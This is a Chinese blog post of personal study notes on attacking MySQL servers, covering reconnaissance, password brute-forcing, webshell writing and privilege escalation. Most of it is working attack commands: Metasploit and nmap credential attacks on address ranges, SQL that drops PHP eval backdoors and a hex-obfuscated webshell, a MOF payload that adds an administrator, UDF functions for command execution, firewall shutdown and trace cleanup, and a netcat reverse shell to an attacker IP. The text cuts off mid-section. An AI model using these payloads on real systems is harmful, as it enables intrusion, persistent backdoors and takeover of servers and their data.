> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1OVpuySJTjoYvWqn2zTS2A)

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrH3aCIr6U2pHR33DF9IgnghVvlFOAgKTlM8ibbPC9sGazXfxHfiauz6Kw/640?wx_fmt=jpeg)

（今天翻到一年前自己学习的 mysql 的笔记，觉得还不错分享一下，自己学习过程的笔记记录）参考：https://www.ddosi.com/b147/

Mysql 渗透和利用学习笔记

1、Mysql 信息收集

1.1 主机收集 3306 端口的主机信息

1.2 版本信息的收集

1.3 数据库管理信息收集

1.4msf 信息收集模块

2、Mysql 密码获取

2.1 暴力破解

2.2 源代码泄漏

2.3 文件包含 (本地文件包含)

2.4 其它情况

3、Mysql 获取 webshell（利用核心 ：) ）

3.1phpmyadmin  root 账号获取 webshell

A、直接读取后门文件 (已有后面情况)

B、查询 select 直接导出一句话后门

C、创建数据库导出一句话后门

D、可执行命令方式

E、过杀毒软件方式

F、直接导出加密 webshell

G、CMS 系统获取 webshell

H、general_log_file 获取 webshell

I、sqlmap 注入点获取 webshell

4、Mysql 提权

4.1mof 提权

4.2msf 直接 mof 提权

4.3UDF 提权

1.UDF 提权条件

2. 提权方法

3.webshell 下 udf 提权

4.Mysql 提权综合利用工具

5. 无法获取 webshell 提权

6、sqlmap 直连数据库提权

7、msf  udf 提权

8、启动项提权

9.Msf 其它相关漏洞提权

10.mysql 密码破解

1、Mysql 信息收集

1.1 主机收集 3306 端口的主机信息

```
nmap端口探测：nmap -p3306  192.168.0.1-254
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrqLhiaHkMgh5AiaromEaVmzKBn1StTnuiavXr3LFfyxVIK8lerqMicmQZtw/640?wx_fmt=png)

1.2 版本信息的收集

(1)msf 查看版本信息：auxiliary/scanner/mysql/mysql_version 模块.

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqr7ibnCa5FP1gvxcibXDKxqPRictGicyeIetpz0Rde08iczT0z6DgJicjiaPIBQ/640?wx_fmt=png)

扫描主机 192.168.0.100 为例：操作命令如下

```
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.0.100
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqr3R1TJgzVWFYcw4tmcibx5EZhUib8wAJ4YRSMh9WEcyg1ScbR31VC2Ksw/640?wx_fmt=png)  

(2)mysql 查询版本命令

```
select @@version;
select version();
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrmiazutdQxVWQMVYWZeSMhqk5K18A8Kd7PYNic6rIPvDwjWv5FpQ3dGicg/640?wx_fmt=png)

      (3)sqlmap 通过注入点确定信息

```
sqlmap -u url --dbms mysql
```

(4)phpmyadmin 管理页面登录后查看 localhost-> 变量 -> 服务器变量和设置中的 version 参数值。(为操作过待验证)

1.3 数据库管理信息收集

mysql 的管理工具或者是 web 页面多种，navicate、phpadmin 等等管理。

这些工具有的会直接保存配置信息，这些信息包含数据库服务器地址和数据库用户名以及密码，通过嗅探或者破解配置文件可以获取密码等信息

1.4msf 信息收集模块

(1)mysql 哈希值枚举 (验证的时候第一次的错误的，第二次的正确的密码)

```
use  auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS 192.168.0.100
set USERNAME root
set PASSWORD root
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqroIhhkO9b3S0kK1m3dhxKgjRRQUeYozb82yt5qEHXCEPiafJL6C4M7icw/640?wx_fmt=png)

        (2) 获取 admin 相关信息

获取数据库版本，操作系统名称，架构，数据库目录，数据库用户以及密码哈希值。

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrsqXwmuyLicK3j7zEB8QdGrJaKcSsfuhPNKRacSHEzptiaHabkWAqgrWQ/640?wx_fmt=png)

```
use auxiliary/admin/mysql/mysql_enum
set RHOSTS 192.168.0.100
set USERNAME root
set PASSWORD root
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrrfRfoIics7ud4TmxMicXo55A7Tc58rrdohwKeib8Aw9npUEG9rFgvUoTA/640?wx_fmt=png)

(3) 执行 mysql 语句，连接成功后可以在 msf 执行 sql 语句，跟 sqlmap 的 --sql-shell 模块类似

```
use auxiliary/admin/mysql/mysql_sql
set RHOSTS 192.168.0.100
set USERNAME root
set PASSWORD root
set SQL show databases;
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrTMrOUX44icztqI1Eo4g6ibICZtQ5UHicafpiaGPly7HgyYow4LVUuJQ0GA/640?wx_fmt=png)

(4) 将 mysql_schem 导出到本地 /root/.msf4/loot / 文件夹下

```
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/admin/mysql/mysql_sql
set RHOSTS 192.168.0.100
set USERNAME root
set PASSWORD root
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrcBoviaotpj9nle38aD422posyVISeBZWnV8kuOs2j87UXB4aQTUUia5g/640?wx_fmt=png)

将 mysql_schem 导出到本地 /root/.msf4/loot / 文件夹下 - 文件的具体表的结构

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrW0cmLMKoaic6GMRlc6KEweavVg6XQaFWA6gFMvqdNR6lzzu8BxszGKg/640?wx_fmt=png)

(5) 文件枚举和目录可写信息枚举

```
auxiliary/scanner/mysql/mysql_file_enum
auxiliary/scanner/mysql/mysql_writable_dirs
```

没有测试成功过，需要定义枚举目录和相关文件.(需要更多的相关的目录字典)  

2、Mysql 密码获取

2.1 暴力破解

(1) 网页在线连接爆破

可以使用

```
burpsuite(https://portswigger.net/burp/)
和
phpMyAdmin(http://pan.baidu.com/s/1c1LD6co)多线程批量破解工具.
```

(2)msf 通过命令行进行暴力破解

```
msf破解mysql密码模块auxiliary/scanner/mysql/mysql_login
对于的很多参数use auxiliary/scanner/mysql/mysql_login
```

```
msf5 auxiliary(scanner/mysql/mysql_login) > show options 
Module options (auxiliary/scanner/mysql/mysql_login):
   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
```

‍  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrDMjgKNiceczZrcA8O9km6qnFJHTQCbUaXZxT9p4TPQiaflFtxzr5OEyg/640?wx_fmt=png)

对单一主机仅仅需要设置 RHOSTS、RPORT、USERNAME、PASSWORD 和 PASS_FILE，其它参数根据实际情况进行设置

(1) 场景 A：对内网获取 root 某一个口令后，扩展渗透

u

```
se auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.0.1-254
set password root
set username root
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrl0sye9Uoh1SNQVUUYYBhNvxt7Mxo2y9abWSqQACwJQpHYiatIb83x0g/640?wx_fmt=png)

执行后对 192.168.0.1-254 进行 mysql 密码扫描验证

(2) 场景 B：使用密码字典进行扫描

```
use auxiliary/scanner/mysql/mysql_login
set RHOSTS  192.168.0.1-254
set pass_file /tmp/password.txt
set username root
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqr7tKNwHWNIzoDeTlnHD4aRNqxQ9BLblibu1ByJjDBIy5PVWx1TxlAyvA/640?wx_fmt=png)

(3) 使用 nmap 扫描并破解密码

A、对某一个 IP 或者 IP 地址段进行 nmap 默认密码暴力破解并扫描

```
nmap --script=mysql-brute 192.168.0.100
nmap --script=mysql-brute 192.168.0.1-254
```

B、使用 root 账号 root 密码进行 mysql 密码验证并扫描获取指定 IP 地址的端口信息以及 mysql 数据库相关信息

```
nmap -sV --script=mysql-databases --script-args mysqluser=root,mysqlpass=root 192.168.0.100
```

C、检查 root 空口令

```
nmap --script mysql-empty-password 192.168.0.100
```

(4) 使用 hscan 工具对 mysql 口令进行扫描，需要设置扫描 IP 地址段以及数据库口令字典及用户名字典。

```
https://github.com/search?q=hscan
```

2.2 源代码泄漏

(1) 网站源代码备份文件（敏感文件 jdbc 的备份、Java 的 xml 配置文件）

一些网站源代码文件中会包含数据库连接文件，通过查看这些文件可以获取数据库账号和密码。一般常见的数据库连接文件为 config.php、web.config、conn.asp、db.php/asp、jdbc.properties、sysconfig.properties、JBOSS_HOME\docs\examples\jca\XXXX-ds.xml。以前有一款工具挖掘鸡可以自定义网站等名称对 zip/rar/tar/tar.gz/gz/sql 等后缀文件进行扫描。

(2) 配置备份文件 (bak 文件)

使用 ultraedit、Editplus 等编辑文件编辑数据库配置文件后，会留下 bak 文件

2.3 文件包含 (本地文件包含)

本地文件包含漏洞可以包含文件，通过查看文件代码获取数据库配置文件，进而读取数据库用户名和密码。

2.4 其它情况

有些软件会将 IP 地址、数据库用户名和密码写进程序中，运行程序后，通过 cain 软件进行嗅探，可以获取数据库密码。另外 Mysql 客户端管理工具有的管理员会建立连接记录，这些连接记录保存了用户名、密码和连接 IP 地址或者主机名，通过配置文件或者嗅探可以获取用户名和密码。

就是客户端保存密码、还有一些注释里面的密码。

3、Mysql 获取 webshell（利用核心 ：) ）

3.1phpmyadmin  root 账号获取 webshell

MysqlRoot 账号通过 phpMyAdmin 获取 webshell 的思路，主要有下面几种方式：

A、直接读取后门文件 (已有后面情况)

通过程序报错、phpinfo 函数、程序配置表等直接获取网站真实路径，有些网站前期已经被人渗透过，因此在目录下留有后门文件通过 load_file 直接读取。

B、查询 select 直接导出一句话后门

前提需要知道网站的真实物理路径，例如呼求偶真实路径 / var/www 或者（E:/www/），则可以通过执行以下查询，来获取一句话后门文件 cmd.php

```
select '<?php @eval($_POST[thelostworld]);?>'INTO OUTFILE '/var/www/shell.php'
```

C、创建数据库导出一句话后门

在查询窗口直接执行以下代码即可，跟 B 原理类似

```
CREATE TABLE `mysql`.`thelostworld` (`temp` TEXT NOTNULL );INSERT INTO `mysql`.`thelostworld` (`temp` ) VALUES('<?php @eval($_POST[thelostworld]);?>');SELECT `temp` FROM `thelostworld` INTO OUTFILE'/var/www/shell.php';DROP TABLE IF EXISTS `thelostworld`;
```

D、可执行命令方式

创建执行命令形式的 shell，但前提是对方未关闭系统函数。该方法导出成功后可以直接执行 DOS 命令，使用方法: www.xxx.com/shell.php?cmd=(cmd = 后面直接执行 dos 命令)。

```
select '' INTO OUTFILE '/var/www/shell.php';
```

另外在 linux 下可以导出直接执行命令的 shell：

```
SELECT '' INTO OUTFILE '/var/www/shell.php';
```

http://localhost/shell.php?c=cat%20/etc/passwd

E、过杀毒软件方式

通过后台或者存在上传图片的地方，上传图片 publicguide.jpg，内容如下：

然后通过图片包含 temp.php，导出 webshell。

```
select ''INTO OUTFILE '/varwww/shell.php';
```

一句话后门密码：antian365

F、直接导出加密 webshell

一句话后门文件密码：pp64mqa2x1rnw68，执行以下查询直接导出加密 webshell，D:/WEB/IPTEST/22.php，注意在实际过程需要修改 D:/WEB/IPTEST/22.php。

```
select unhex('203C3F7068700D0A24784E203D2024784E2E737562737472282269796234327374725F72656C6750383034222C352C36293B0D0A246C766367203D207374725F73706C697428226D756B3961773238776C746371222C36293B0D0A24784E203D2024784E2E73756273747228226C396364706C616365704172424539646B222C342C35293B0D0A246A6C203D2073747269706F732822657078776B6C3766363674666B74222C226A6C22293B0D0A2474203D2024742E737562737472282274514756325957774A63567534222C312C36293B0D0A2465696137203D207472696D28226A386C32776D6C34367265656E22293B0D0A2462203D2024622E73756273747228226B6261736536346B424474394C366E6D222C312C36293B0D0A246967203D207472696D28226233397730676E756C6922293B0D0A2479203D2024792E24784E28227259222C22222C22637259726572596122293B0D0A24797531203D207374725F73706C697428226269316238376D3861306F3678222C32293B0D0A2474203D2024742E24784E282278413678222C22222C2277784136786F4A463922293B0D0A246E64203D2073747269706F7328226E363574383872786E303265646A336630222C226E6422293B0D0A2462203D2024622E24784E282277493339222C22222C225F774933396477493339656322293B0D0A2468387073203D207374725F73706C697428226B6E396A3968346D6877676633666A6970222C33293B0D0A2479203D2024792E7375627374722822687974655F66756E775669535645344A222C322C36293B0D0A24796637203D207374726C656E282275656875343967367467356B6F22293B0D0A2474203D2024742E24784E28226670222C22222C22516670546670314E667022293B0D0A246D39203D207374726C656E282265756C363034636F626B22293B0D0A2462203D2024622E73756273747228226C3057316F64656C413165536E454A222C342C33293B0D0A2468306277203D207472696D28226E33653568306371746F6B76676F6238747822293B0D0A2479203D2024792E24784E28227962222C22222C2263796274696F22293B0D0A24733761203D20727472696D2822617565627963396734743564386B22293B0D0A2474203D2024742E7375627374722822624D73306E4268383355577964222C392C34293B0D0A2464353971203D2073747269706F732822636A7675636B6F79357766336F746561222C226435397122293B0D0A2479203D2024792E73756273747228226E4439487851534C386E6752222C392C31293B0D0A246C31203D207374725F73706C697428226167717130396762716E31222C34293B0D0A2474203D2024742E24784E282277366F34222C22222C2277634477366F345977366F343022293B0D0A247079203D2073747269706F7328226C677938687472727631746333222C22707922293B0D0A2474203D2024742E24784E282265503332222C22222C22625846655033326822293B0D0A2478703364203D2073747269706F732822756B6C306E626E7839677433222C227870336422293B0D0A2474203D2024742E7375627374722822696B4A3030484A4D6E677863222C372C35293B0D0A2464743262203D207374726C656E282265346135616275616A7733766C6369726122293B0D0A2474203D2024742E737562737472282263644E314B78656D35334E776D456838364253222C372C34293B0D0A2475626A203D207374726C656E28227767686A6E6674326F70356B7831633038367422293B0D0A2474203D2024742E73756273747228226D34616F7864756A676E58536B63784C344657635964222C372C36293B0D0A247178203D207374726C656E2822726C71666B6B6674726F3867666B6F37796122293B0D0A2474203D2024742E7375627374722822723779222C312C31293B0D0A246D75203D20727472696D28226E676478777578357671653122293B0D0A246A203D2024792822222C20246228247429293B0D0A24626E6C70203D207374726C656E28227675667930616B316679617622293B0D0A24736468203D207374725F73706C69742822776D6E6A766733633770306D222C34293B0D0A246D62203D206C7472696D28226E353270317067616570656F6B6622293B0D0A2465307077203D20727472696D28227575346D686770356339706E613465677122293B0D0A24756768203D207472696D282272637064336F3977393974696F3922293B0D0A246772636B203D207374726C656E2822783572697835627031786B793722293B0D0A24656F3674203D207374726C656E282264646931683134656375797563376422293B246A28293B0D0A2464766E71203D207374725F73706C6974282270726D36676968613176726F333630346175222C38293B0D0A24756738203D20727472696D28226563387735327375706234767538656F22293B0D0A24726374203D2073747269706F73282268786536776F37657764386D65376474222C2272637422293B0D0A24656B7166203D207374725F73706C69742822707266357930386538666C6666773032356A38222C38293B0D0A24767972203D207374725F73706C69742822756D706A63737266673668356E64366F3435222C39293B0D0A24777266203D20727472696D282266797839396F3739333868377567716822293B0D0A24713134203D207374726C656E2822746334366F73786C3173743169633222293B0D0A66756E6374696F6E206F2820297B2020207D3B0D0A24757366203D207374726C656E2822666C7463707862377466626A736D7422293B0D0A3F3E') into dumpfile 'D:/WEB/IPTEST/22.php'
```

注意：

也可以使用 http://tool.lu/hexstr / 网站的代码转换来实现，将需要导出的文件代码复制到网站的字符串中，通过字符串转成十六进制，将十六进制字符串放入 unhex 函数进行查询即可：

```
select unhex('十六进制字符串') into dumpfile 'D:/WEB/shell.php'
```

G、CMS 系统获取 webshell

有些情况下无法获取网站的真实路径，则意味着无法直接导出一句话 webshell，可以通过 CMS 系统管理账号登录系统后，寻找漏洞来突破，例如 dedecms 则可以通过破解管理员账号后直接上传文件来获取 webshell。Discuz！的 UC_key 可以直接获取 webshell。甚至某些系统可以直接上传 php 文件。下面是一些 CMS 系统渗透的技巧：

（1）dedecms 系统的密码有直接 md5，也有 20 位的密码，如果是 20 位的密码则需要去掉密码中的前 3 位和最后 1 位，然后对剩余的值进行 md5 解密即可；

（2）phpcms v9 版本的密码需要加 salt 进行破解，需要选择破解算法 md5(md5($pass).$salt) 进行破解。

（3）Discuz！论坛帐号保存在 ucenter_members（Discuz7.X 及以上版本）或者 cdb_members（discuz6.x 版本）表中，其破解需要带 salt 进行，其破解时是使用 password:salt 进行，例如 a0513df9929afc972f024fa4e586e829:399793。

H、general_log_file 获取 webshell

（1）查看 genera 文件配置情况

```
show global variables like "%genera%";
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqryCQgk3UFR1vzicvS8407CxctY9PGRACV22ldwPmbtxg80IsSnkcW9wQ/640?wx_fmt=png)

（2）关闭 general_log

```
set global general_log=off;
```

（3）通过 general_log 选项来获取 webshell

```
set global general_log='on';SET global general_log_file='/var/www/cmd.php';
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqr03FRicVCxcFck5qwfnzp5YBc6UehnIyIwdS4Ph4ZGlDicIObrEaxavMg/640?wx_fmt=png)

在查询中执行语句：

```
SELECT '';
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrMTbcA233LU3WUEfnicJqlfkhLSBOtDsowygYPKPPe37GpX3bTQPdeGg/640?wx_fmt=png)

Shell 为 cmd.php，一句话后门，密码为 cmd。

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrHxrBUxsiciceGWeYYFW2V4RF8fGfCkmjd3VBsJqu640rZtUqCjd4Bo3w/640?wx_fmt=png)

I、sqlmap 注入点获取 webshell

sqlmap 注入点获取 webshell 的前提是具备写权限，一般是 root 账号，通过执行命令来获取

```
sqlmap -u url--os-shell echo "" >/data/www/shell.php
```

4、Mysql 提权

4.1mof 提权

（1）Webshell 上传 mof 文件提权

MySQL Root 权限 MOF 方法提权是来自国外 Kingcope 大牛发布的 MySQL Scanner & MySQL Server for Windows Remote SYSTEM Level Exploit(https://www.exploit-db.com/exploits/23083)，简称 mysql 远程提权 0day(MySQL Windows Remote System Level Exploit (Stuxnet technique) 0day)。Windows 管理规范 (WMI) 提供了以下三种方法编译到 WMI 存储库的托管对象格式 (MOF) 文件：

方法 1：运行 MOF 文件指定为命令行参数 Mofcomp.exe 文件。方法 2：使用 IMofCompiler 接口和 $ CompileFile 方法。方法 3：拖放到 %SystemRoot%\System32\Wbem\MOF 文件夹的 MOF 文件

Microsoft 建议您到存储库编译 MOF 文件使用前两种方法。也就是运行 Mofcomp.exe 文件，或使用 IMofCompiler::CompileFile 方法。第三种方法仅为向后兼容性与早期版本的 WMI 提供，并因为此功能可能不会提供在将来的版本后，不应使用。注意使用 MOF 方法提权的前提是当前 Root 帐号可以复制文件到 %SystemRoot%\System32\Wbem\MOF 目录下，否则会失败！

该漏洞的利用前提条件是必须具备 mysql 的 root 权限，在 Kingcope 公布的 0day 中公布了一个 pl 利用脚本。

perl mysql_win_remote.pl 192.168.2.100 root "" 192.168.2.150 5555

192.168.2.100 为 mysql 数据库所在服务器，mysql 口令为空，反弹到 192.168.2.150 的 5555 端口上。

（2）生成 nullevt.mof 文件

将以下代码保存为 nullevt.mof 文件

```
#pragma namespace("\\.\root\subscription") 

instance of __EventFilter as $EventFilter

{ 

EventNamespace = "Root\Cimv2"; 

Name  = "filtP2"; 

    Query = "Select \ From __InstanceModificationEvent " 

            "Where TargetInstance Isa \"Win32_LocalTime\" " 

            "And TargetInstance.Second = 5"; 

QueryLanguage = "WQL"; 

}; 



instance of ActiveScriptEventConsumer as $Consumer 

{ 

    Name = "consPCSV2"; 

ScriptingEngine = "JScript"; 

ScriptText = 

    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add")"; 

}; 

instance of __FilterToConsumerBinding

{ 

    Consumer   = $Consumer; 

    Filter = $EventFilter; 

};
```

（3）通过 Mysql 查询将文件导入

执行以下查询语句，将上面生成的 nullevt.mof 导入到 c:\windows\system32\wbem\mof \ 目录下在 windows7 中默认是拒绝访问的。导入后系统会自动运行，执行命令。

```
selectload_file('C:\RECYCLER\nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
```

4.2msf 直接 mof 提权

Msf 下的 exploit/windows/mysql/mysql_mof 模块提供了直接 Mof 提权，不过该漏洞成功跟操作系统权限和 Mysql 数据库版本有关，执行成功后会直接反弹 shell 到 meterpreter。

```
use exploit/windows/mysql/mysql_mof
set rhost 192.168.0.100 //设置需要提权的远程主机IP地址
set rport 3306 //设置mysql的远程端口
set password root //设置mysql数据库root密码
set username root //设置mysql用户名
options //查看设置
run 0
```

技巧：

要是能够通过网页连接管理（phpmyadmin），则可以修改 host 为 % 并刷新权限后，则可以通过 msf 等工具远程连接数据库。默认 root 等账号不允许远程连接，除非管理员或者数据库用户自己设置。

方法 1：本地登入 mysql，更改 mysql 数据库里的 user 表里的 host 项，将 localhost 改为 %

```
use mysql;
update user set host = '%' where user = 'root';
FLUSH PRIVILEGES ;
select host, user from user;
```

方法 2：直接授权 (推荐)

从任何主机上使用 root 用户，密码：youpassword（你的 root 密码）连接到 mysql 服务器：

```
# mysql -u root -proot
GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'youpassword' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

推荐重新增加一个用户，在实际测试过程中发现很多服务器使用 root 配置了多个地址，修改后可能会影响实际系统的运行。在实际测试过程中因此建议新增一个用户，授权所有权限，而不是直接更改 root 配置。

4.3UDF 提权

UDF 提权是利用 MYSQL 的自定义函数功能，将 MYSQL 账号转化为系统 system 权限，其利用条件是目标系统是 Windows(Win2000,XP,Win2003)；拥有 MYSQL 的某个用户账号，此账号必须有对 mysql 的 insert 和 delete 权限以创建和抛弃函数, 有 root 账号密码

Windows 下 UDF 提权对于 Windows2008 以下服务器比较适用，也即针对 Windows2000、Windows2003 的成功率较高。

1.UDF 提权条件

（1）Mysql 版本大于 5.1 版本 udf.dll 文件必须放置于 MYSQL 安装目录下的 lib\plugin 文件夹下。（2）Mysql 版本小于 5.1 版本。udf.dll 文件在 Windows2003 下放置于 c:\windows\system32，在 windows2000 下放置于 c:\winnt\system32。（3）掌握的 mysql 数据库的账号有对 mysql 的 insert 和 delete 权限以创建和抛弃函数，一般以 root 账号为佳，具备 `root 账号所具备的权限的其它账号也可以。（4）可以将 udf.dll 写入到相应目录的权限。

2. 提权方法

（1）获取数据库版本、数据位置以及插件位置等信息

```
select version();//获取数据库版本
select user();//获取数据库用户
select @@basedir ;//获取安装目录
show variables like '%plugins%';  //寻找mysql安装路径
```

操作截图：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqrs83Nt6NE6TSJf5EdRicPlqEP5ib4iaZmMQfIF2lQad4ZY0QCHqxUIcSkw/640?wx_fmt=png)

（2）导出路径

```
C:\Winnt\udf.dll    Windows 2000
C:\Windows\udf.dll   Windows2003（有的系统被转义，需要改为C:Windowsudf.dll）
```

MYSQL 5.1 以上版本，必须要把 udf.dll 文件放到 MYSQL 安装目录下的 libplugin 文件夹下才能创建自定义函数。该目录默认是不存在的，这就需要我们使用 webshell 找到 MYSQL 的安装目录，并在安装目录下创建 libplugin 文件夹，然后将 udf.dll 文件导出到该目录即可。

在某些情况下，我们会遇到 Can't open shared library 的情况，这时就需要我们把 udf.dll 导出到 lib\plugin 目录下才可以，网上大牛发现利用 NTFS ADS 流来创建文件夹的方法：

```
select @@basedir;  //查找到mysql的目录
select 'It is dll' into dumpfile 'C:\Program Files\MySQL\MySQL Server 5.1\lib::$INDEX_ALLOCATION';   //利用NTFS ADS创建lib目录
select 'It is dll' into dumpfile 'C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin::$INDEX_ALLOCATION';//利用NTFS ADS创建plugin目录
```

执行成功以后就会 plugin 目录，然后再进行导出 udf.dll 即可。

（3）创建 cmdshell 函数，该函数叫什么名字在后续中则使用该函数进行查询

```
create function cmdshell returns string soname ‘lib_mysqludf_sys.dll’;
```

（4）执行命令：

```
select sys_eval(‘whoami’);
```

一般情况下不会出现创建不成功哦。

连不上 3389 可以先停止 windows 防火墙和筛选

```
select sys_eval(‘net stop policyagent’);
select sys_eval(‘net stop sharedaccess’);
```

udf.dll 下常见函数：

cmdshell  执行 cmd; downloader  下载者, 到网上下载指定文件并保存到指定目录; open3389    通用开 3389 终端服务, 可指定端口 (不改端口无需重启); backshell   反弹 Shell; ProcessView 枚举系统进程; KillProcess 终止指定进程; regread     读注册表; regwrite    写注册表; shut        关机, 注销, 重启; about       说明与帮助函数;

具体用户示例：

```
select cmdshell('net user iis_user 123!@#abcABC /add');
select cmdshell('net localgroup administrators iis_user /add');
select cmdshell('regedit /s d:web3389.reg');
select cmdshell('netstat -an');
```

（5）清除痕迹

```
drop function cmdshell;//将函数删除
```

删除 udf.dll 文件以及其它相关入侵文件及日志。

（6）常见错误

```
1290 – The MySQL server is running with the –secure-file-priv option so it cannot execute this statement


在my.ini或者mysql.cnf文件中注销 (使用#号) 包含secure_file_priv的行(SHOW VARIABLES LIKE "secure_file_priv")。


1123 – Can’t initialize function ‘backshell’; UDFs are unavailable with the –skip-grant-tables option


需要将my.ini中的skip-grant-tables选项去掉。
```

3.webshell 下 udf 提权

通过集成 udf 提权的 webshell 输入数据库用户名及密码以及数据库服务器地址或者 IP 通过连接后导出进行提权。

4.Mysql 提权综合利用工具

```
v5est0r 写了一个Mysql提权综合利用工具（https://github.com/thelostworldFree/Python_FuckMySQL）
（1）自动导出你的backdoor和mof文件
（2）自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权
（3）导出LPK.dll文件，劫持系统目录提权
（4）写启动项提权


UdF自动提权：
python root.py -a 127.0.0.1 -p root -e "ver&whoami" -m udf


LPK劫持提权：
python root.py -a 127.0.0.1 -p root -e "ver&whoami" -m lpk


启动项提权：
python root.py -a 127.0.0.1 -p root -e "ver&whoami" –mst


例如通过LOAD_FILE来查看Mysql配置文件my.ini，如果其中配置了skip-grant-tables，这无法进行提权
```

5. 无法获取 webshell 提权

1. 连接 mysql

（1）mysql.exe -h ip -uroot -p （2）phpmyadmin （3）Navicat for MySQL

2. 查看数据库版本和数据路径

```
SELECT VERSION();
Select @@datadir;
5.1以下版本，将dll导入到c:/windows或者c:/windows/system32/
5.1以上版本 通过以下查询来获取插件路径：SHOW VARIABLES WHERE Variable_Name LIKE "%dir";
show variables like '%plugin%' ;
select load_file('C:/phpStudy/Apache/conf/httpd.conf')
select load_file('C:/phpStudy/Apache/conf/vhosts.conf')
select load_file('C:/phpStudy/Apache/conf/extra/vhosts.conf')
select load_file('C:/phpStudy/Apache/conf/extra/httpd.conf')
select load_file('d:/phpStudy/Apache/conf/vhosts.conf')
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcHJAVShJptND6ZQZXT7eqribO5dYDa0oc002ibLpPibAFWMBCyfZzFK93wSichDIic2qfOyjVe1rKQiaAg/640?wx_fmt=png)

3. 修改 mysql.txt

Mysql.txt 为 udf.dll 的二进制文件转成十六进制代码。

（1）先执行导入 ghost 表中的内容

修改以下代码的末尾代码 select backshell(“YourIP”,4444);

（2）导出文件到某个目录

```
select data from Ghost into dumpfile 'c:/windows/mysqldll.dll'; 
select data from Ghost into dumpfile 'c:/windows/system32/mysqldll'; 
select data from Ghost into dumpfile 'c:/phpStudy/MySQL/lib/plugin/mysqldll'; 
select data from Ghost into dumpfile 'E:/PHPnow-1.5.6/MySQL-5.0.90/lib/plugin/mysqldll'; 
select data from Ghost into dumpfile 'C:/websoft/MySQL/MySQL Server 5.5/lib/plugin/mysqldll.dll' 
select data from Ghost into dumpfile 'D:/phpStudy/MySQL/lib/plugin/mysqldll.dll'; 
select load_file('C:/ProgramData/MySQL/MySQL Server 5.1/Data/mysql/user.frm');
select data from Ghost into dumpfile 'C:\Program Files\MySQL\MySQL Server 5.1\lib/plugin/mysqldll.dll'
```

（3）查看 FUNCTION 中是否存在 cmdshell 和 backshell

```
存在则删除：
drop FUNCTION cmdshell;//删除cmdshell
drop FUNCTION backshell;//删除backshell


创建backshell：
CREATE FUNCTION backshell RETURNS STRING SONAME 'mysqldll.dll'; //创建backshell


在具备独立主机的服务器上执行监听:
nc -vv -l -p 44444


执行查询：
select backshell("192.192.192.1",44444);//修改192.192.192.1为你的IP和端口


4.获取webshell后添加用户命令


注意如果不能直接执行，则需要到c:\windows\system32\下执行
net user antian365 www.xianzhi.aliyun.com /add 

net localgroup administrators antian365


6、sqlmap直连数据库提权
Sqlmap直接连接数据库提权，需要有写入权限和root账号及密码，命令如下：
（1）连接数据库
